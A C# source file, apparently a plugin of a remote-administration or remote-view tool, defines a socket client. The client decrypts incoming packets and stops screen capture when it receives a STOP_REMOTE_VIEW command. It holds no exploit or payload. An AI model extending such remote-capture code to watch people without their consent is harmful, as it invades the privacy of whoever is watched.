using Microsoft.Win32.SafeHandles;
using Shared;
using System;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using static Shared.Serializer;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    internal class Client : IDisposable
    {
        public Socket S { get; set; }
        public int Port { get; set; }
        public string IP { get; set; }
        public string HWID { get; set; }
        public string Key { get; set; }
        public Client(Socket Client)
        {
            this.S = Client;
            this.IP = S.RemoteEndPoint.ToString();
            Task.Run(() => ReadData());
        }

        private void ReadData()
        {
            try
            {
                while (S.Connected)
                {
                    byte[] dataReceived = Encryption.RSMTool.RSMDecrypt(ReceiveData(), Encoding.Unicode.GetBytes(Key));

                    if (dataReceived.Length > 0)
                    {

                        Data data = Shared.Serializer.Deserialize(dataReceived);

                        switch (data.Type)
                        {
                            case PacketType.STOP_REMOTE_VIEW:
                                Functions.hasToCapture = false;
                                break;
                        }
                    }
                }
            }
            catch { }
            this.Dispose();
            Shared.Utils.ClearMem();
        }

        private byte[] ReceiveData()
        {
            int total = 0;
            int recv;
            byte[] datasize = new byte[4];
            S.Poll(-1, SelectMode.SelectRead);
            recv = S.Receive(datasize, 0, 4, 0);
            int size = BitConverter.ToInt32(datasize, 0);
            int dataleft = size;
            byte[] data = new byte[size];
            while (total < size)
            {

                recv = S.Receive(data, total, dataleft, 0);
                total += recv;
                dataleft -= recv;
            }
            return data;
        }

        public void CloseClient()
        {
            this.S.Shutdown(System.Net.Sockets.SocketShutdown.Both);
            this.S.Close();
            this.S.Dispose();
            this.Dispose();
        }

        private bool _disposed = false;

        // Instantiate a SafeHandle instance.
        private SafeHandle _safeHandle = new SafeFileHandle(IntPtr.Zero, true);

        // Public implementation of Dispose pattern callable by consumers.
        public void Dispose() => Dispose(true);

        // Protected implementation of Dispose pattern.
        protected virtual void Dispose(bool disposing)
        {
            if (_disposed)
            {
                return;
            }

            if (disposing)
            {
                // Dispose managed state (managed objects).
                _safeHandle?.Dispose();
            }

            _disposed = true;
            GC.SuppressFinalize(this);
        }
    }
}
